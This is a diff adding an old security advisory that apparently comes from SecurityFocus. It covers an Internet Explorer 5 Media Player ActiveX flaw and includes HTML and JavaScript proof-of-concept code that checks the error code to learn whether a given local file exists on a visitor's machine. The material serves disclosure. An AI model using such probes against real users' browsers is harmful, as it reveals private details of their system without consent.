@@ -1,0 +1,27 @@
+Microsoft Internet Explorer 5.0 for Windows 2000/Windows 95/Windows 98/Windows NT 4 Media Player ActiveX Error Message Vulnerability
+
+source: http://www.securityfocus.com/bid/793/info
+
+The Windows Media Player ActiveX control, shipped with IE 5, returns a specific error code if it is instructed to load a local file that does not exist. In this way, an attacker could determine whether or not a specified file on the victim's host exists. This could be used to determine user names and other facets of system configuration.
+
+Demonstration code:
+<object id="wm" WIDTH=0 HEIGHT=0
+classid="clsid:22D6F312-B0F6-11D0-94AB-0080C74C7E95"
+>
+</object>
+<SCRIPT>
+// -2147220970
+function checkfile()
+{
+b=document.all.wm;
+b.FileName=document.forms[0].elements[0].value;
+if (b.ErrorCode == -2147220970)
+alert("File does not exist")
+else
+alert("File exists");
+}
+</SCRIPT>
+<FORM>
+<INPUT TYPE="TEXT" VALUE="C:\AUTOEXEC.BAT" SIZE=60>
+<INPUT TYPE="SUBMIT" VALUE="Check file" onclick="checkfile()">
+</FORM> 
